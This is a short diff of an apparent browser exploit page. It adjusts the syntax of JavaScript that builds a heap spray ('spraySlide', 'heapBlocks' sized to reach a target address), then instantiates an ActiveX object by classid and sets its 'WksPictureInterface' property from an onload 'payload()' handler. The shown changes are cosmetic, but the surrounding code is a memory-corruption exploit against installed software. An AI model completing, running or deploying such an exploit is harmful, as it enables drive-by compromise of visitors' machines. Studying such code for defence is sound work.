@@ -24,7 +24,7 @@ spraySlide = getSpraySlide(spraySlide,spraySlideSize);
 
 heapBlocks = (heapSprayToAddress - 0x400000)/heapBlockSize; 
 
-memory = new Array(); 
+memory = [];
 
 for (i=0;i<heapBlocks;i++) 
 { 
@@ -51,7 +51,7 @@ obj.WksPictureInterface = num;
   } 
    </script> 
 </head> 
- <body onload="JavaScript: return payload();"> 
+ <body onload="return payload();">
 <object classid="clsid:00E1DB59-6EFD-4CE7-8C0A-2DA3BCAAD9C6" id="obj"> 
 </object> 
  </body> 
